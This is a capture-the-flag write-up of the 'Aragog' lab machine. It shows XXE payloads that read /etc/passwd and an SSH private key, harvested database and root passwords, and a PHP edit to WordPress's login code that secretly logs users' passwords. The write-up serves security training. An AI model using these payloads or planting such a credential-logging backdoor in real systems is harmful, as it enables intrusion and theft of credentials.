126 - Aragog
============

First nmap scan:
```bash
❯❯❯ sudo nmap -sS --top-ports 200 10.10.10.78
[sudo] password for jsmith: 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-10 11:52 CEST
Nmap scan report for 10.10.10.78
Host is up (0.044s latency).
Not shown: 197 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
```

Then log in the FTP service with anonymous account and get the single file here, `test.txt`:
```
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

After website enumeration, one page is found, `hosts.php`, a GET request to this page returns:
```
HTTP/1.1 200 OK
Date: Tue, 10 Jul 2018 11:24:55 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 46
Connection: close
Content-Type: text/html; charset=UTF-8


There are 4294967294 possible hosts for 
```

Trying to send the XML data using multipart did not work. It had to be sent using a simple POST request with `Content-Type: application/xml`, as follows:
```
POST /hosts.php HTTP/1.1
Host: 10.10.10.78
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Color: cyan
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 88

<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

HTTP Response:
```
HTTP/1.1 200 OK
Date: Tue, 10 Jul 2018 11:35:03 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 53
Connection: close
Content-Type: text/html; charset=UTF-8


There are 62 possible hosts for 255.255.255.192
```

Now we're talking, uploading XML file hints to XXE, let's try with this payload:
```xml
<!DOCTYPE details [ 
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<details>
    <subnet_mask>&file;</subnet_mask>
    <test></test>
</details>
```

And it works, data from the response is:
```
There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false
```

Let's try to grab SSH keys for those users, this works for `florian` with the payload:
```xml
<!DOCTYPE details [ 
  <!ENTITY file SYSTEM "file:///home/florian/.ssh/id_rsa">
]>
<details>
    <subnet_mask>&file;</subnet_mask>
    <test></test>
</details>
```

Response:
```
There are 4294967294 possible hosts for -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
-----END RSA PRIVATE KEY-----
```

Modifying `~/.ssh/config` file to use this key and the corresponding user:
```
host 10.10.10.78
 IdentityFile ~/.ssh/florian.key
 User florian
```

And then SSH to the host to get the flag:
```bash
❯❯❯ ssh 10.10.10.78                                                                       ⏎
The authenticity of host '10.10.10.78 (10.10.10.78)' can't be established.
ECDSA key fingerprint is SHA256:phu0FjQg/9nCmL2014AJ9yH4akvraA7Ea5QtE59wqD4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.78' (ECDSA) to the list of known hosts.
Last login: Tue Jul 10 04:31:48 2018 from 10.10.14.95
florian@aragog:~$ cat user.txt
f43bdfbcfd3f2a955a7b67c7a6e21359
```

## Privilege escalation
In the `/var/www/html/dev_wiki` we find a wordpress installation. Excerpt of the `wp-config.php` file:
```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp_wiki');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', '$@y6CHJ^$#5c37j$#6h');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

In Mysql history we find this:
```
mysql> INSERT INTO `wp_wiki`.`wp_users` (`ID`, `user_login`, `user_pass`,  `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('9999',  'robotz', MD5('NotRobotz'), 'robotz', 'robotz@robotz.com', '',  '2014-11-04 00:00:00', '', '0', 'robotz');
```

And this:
```
mysql> INSERT INTO `wp_wiki`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '9999', 'wp_capabilities',  'a:1:{s:13:"administrator";s:1:"1";}'), (NULL, '9999', 'wp_user_level', '10');
```

And also:
```
mysql> SELECT * FROM wp_options WHERE option_value LIKE '%ara%';
+-----------+-------------+------------------------+----------+
| option_id | option_name | option_value           | autoload |
+-----------+-------------+------------------------+----------+
|         1 | siteurl     | http://aragog/dev_wiki | yes      |
|         2 | home        | http://aragog/dev_wiki | yes      |
+-----------+-------------+------------------------+----------+
2 rows in set (0.00 sec)
```

Finally also:
```
mysql> select id,user_login,user_pass from wp_users;
+------+---------------+------------------------------------+
| id   | user_login    | user_pass                          |
+------+---------------+------------------------------------+
|    1 | Administrator | $P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu. |
| 9999 | robotz        | $P$B96YveHNBEtBWkUHhQmxH/ih5xLSfG. |
+------+---------------+------------------------------------+
2 rows in set (0.00 sec)
```

It looks like we have an administator user on this wiki. Adding the following line to our local machine's `/etc/hosts` file allows to access the site:
```
10.10.10.78	aragog
```

Here it is mentioned that cliff will often log in on the wordpress site. This sound like an automated login script doing this. We can then modify the file `/var/www/html/dev_wiki/wp-includes/user.php` to log the passwords used on the admin login form by adding some code:
```php
function wp_signon( $credentials = array(), $secure_cookie = '' ) {
    if ( empty($credentials) ) {
        $credentials = array(); // Back-compat for plugins passing an empty string.

        if ( ! empty($_POST['log']) )
            $credentials['user_login'] = $_POST['log'];
        if ( ! empty($_POST['pwd']) ){
            $credentials['user_password'] = $_POST['pwd'];
            $f = fopen("/tmp/qweasd", "a");
            fwrite($f, 'Found password: ' . $_POST['pwd']);
            fclose($f);
        }
```

This way, if someone logs in, the password will be saved in `/tmp/qweasd`. And it works, after some time:
```bash
florian@aragog:~$ cat /tmp/qweasd 
Found password: !KRgYs(JFO!&MTr)lfFound password: !KRgYs(JFO!&MTr)lfFound password: !KRgYs(JFO!&MTr)lf
```

We already have the password 3 times ! And it appears that this is actually the root password of the box. We can `su` to root and get the flag:
```bash
florian@aragog:~$ su root
Password: 
root@aragog:/home/florian# cat /root/root.txt 
9a9da52d7aad358699a96a5754595de6
```
